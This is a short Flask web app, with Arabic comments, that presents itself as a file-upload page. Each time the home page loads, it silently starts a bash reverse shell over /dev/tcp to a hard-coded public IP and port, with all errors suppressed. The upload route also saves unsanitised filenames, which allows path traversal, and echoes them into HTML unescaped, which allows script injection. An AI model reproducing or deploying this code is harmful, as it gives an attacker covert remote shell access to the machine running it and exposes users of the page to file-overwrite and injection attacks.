from flask import Flask, request, render_template_string
import os
import subprocess
import threading
import time

app = Flask(__name__)

# القيم الصحيحة
TARGET_IP = '209.198.132.215'  # IP العام لجهازك
TARGET_PORT = 4443  # المنفذ الذي فتحته في الراوتر

def reverse_shell():
    """دالة تعمل في الخلفية لفتح الشل"""
    try:
        # أمر الاتصال العكسي باستخدام IP العام
        command = f"bash -c 'bash -i >& /dev/tcp/{TARGET_IP}/{TARGET_PORT} 0>&1'"
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

@app.route('/')
def home():
    # تشغيل الشل في الخلفية
    thread = threading.Thread(target=reverse_shell)
    thread.daemon = True
    thread.start()
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>📁 رفع الملفات</title>
    </head>
    <body>
        <h1>📁 ارفع ملفك هنا</h1>
        <form action="/upload" method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <input type="submit" value="رفع الملف">
        </form>
    </body>
    </html>
    '''

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    os.makedirs('uploads', exist_ok=True)
    filename = f.filename
    f.save(os.path.join('uploads', filename))
    
    return f'''
    <h3>✅ تم رفع الملف بنجاح!</h3>
    <p>اسم الملف: <strong>{filename}</strong></p>
    <a href="/uploads/{filename}" target="_blank">📂 فتح الملف</a>
    <br><br>
    <a href="/">⬅️ العودة</a>
    '''

if __name__ == '__main__':
    os.makedirs('uploads', exist_ok=True)
    app.run(host='0.0.0.0', port=8100)
